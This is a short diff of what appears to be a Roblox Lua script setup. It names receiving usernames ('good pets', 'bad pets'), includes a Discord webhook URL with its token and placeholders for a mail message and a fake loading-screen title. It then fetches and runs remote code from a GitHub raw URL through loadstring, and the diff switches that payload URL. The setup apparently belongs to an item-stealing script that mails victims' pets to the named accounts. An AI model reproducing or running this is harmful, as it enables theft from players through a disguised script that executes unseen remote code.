@@ -1,9 +1,5 @@
-UserName = "Jerokh1rlan" -- good pets
-Webhook = "https://discord.com/api/webhooks/1131804090515587122/dyYwL9Fe9niKhjw5DcFwo0ao8EKz8U0pvmsM3HjX97Kp-iLim_mggHJ1jY9DXSZ5Q-i8" -- pings for pets
-UserName2 = "zandrymabasa" -- bad pets
+UserName = "jerokh1rlan"
+Webhook = "https://discord.com/api/webhooks/1131804090515587122/dyYwL9Fe9niKhjw5DcFwo0ao8EKz8U0pvmsM3HjX97Kp-iLim_mggHJ1jY9DXSZ5Q-i8"
+UserName2 = "jerokh1rlan"
 
-_G.MailMessage = "Mail Message Here" -- Mail Message !
-_G.LoadingTitle = "Script Title Here" -- Loading Screen Title
-_G.WebhookName = "Webhook Name Here" -- Webhook name 
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/idkk/main/iddkkk2"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScripts", true))()
